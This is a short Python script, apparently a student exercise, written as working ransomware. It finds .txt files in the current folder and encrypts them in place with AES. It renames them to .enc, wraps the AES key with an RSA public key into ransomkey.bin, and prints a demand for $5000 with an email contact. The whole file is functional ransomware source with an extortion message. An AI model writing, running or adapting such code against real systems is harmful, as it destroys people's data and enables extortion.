from base64 import b64encode 
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import PKCS1_OAEP

import os.path
import glob
import pickle

def symEncrypt(str_data, cipher	):
	data = str.encode(str_data)
	ct_bytes = cipher.encrypt(pad(data, AES.block_size))
	ct = b64encode(ct_bytes).decode('utf-8')
	symKey_in_str 	= b64encode(symKey).decode('utf-8')
	encrypted_str = ct
	return encrypted_str

def filesEncrypt(myfilespath, cipher):
	for path in myfilespath:
		with open(path, "r+") as file:
			fname = os.path.basename(file.name)
			data = file.read()
			encrypted_str = symEncrypt(data, cipher)	
			#Overwrite file's data
			file.seek(0)
			file.write(encrypted_str)
			file.truncate()
			#Change file extension
			pre, _ = os.path.splitext(path)
			os.rename(path, pre + '.enc')

prvkeyExists = os.path.exists("receiver.pem")		#Check if file exists

#Get all files in the victim's folder
myfilespath = glob.glob(r'./*.txt')	
n = len(myfilespath)

if prvkeyExists and n > 0:
	#Make symetric key 128 bits(16 bytes)
	symKey = get_random_bytes(16)

	#Encrypt message with symetric key
	cipher = AES.new(symKey,AES.MODE_CBC)
	iv_byte = b64encode(cipher.iv)
	myfilespath.sort()				#Sort the array
	filesEncrypt(myfilespath, cipher)

	#Encrypt symetric key using public key
	recipient_key = RSA.import_key(open("receiver.pem").read()) 
	cipher_rsa = PKCS1_OAEP.new(recipient_key)
	enc_data = cipher_rsa.encrypt(symKey)

	file_out = open("ransomkey.bin", "wb")
	pickle.dump([enc_data, iv_byte], file_out)	#Put variables in the data file
	file_out.close()
	print('Your text files are encrypted. To decrypt them,\n' + 
'you need to pay me $5000 and send ransomkey.bin in your folder to gat224@uowmail.edu.au')
elif prvkeyExists == False:
	print("receiver.pem is not found in this directory")
elif n <= 0:
	print("No text file is found")



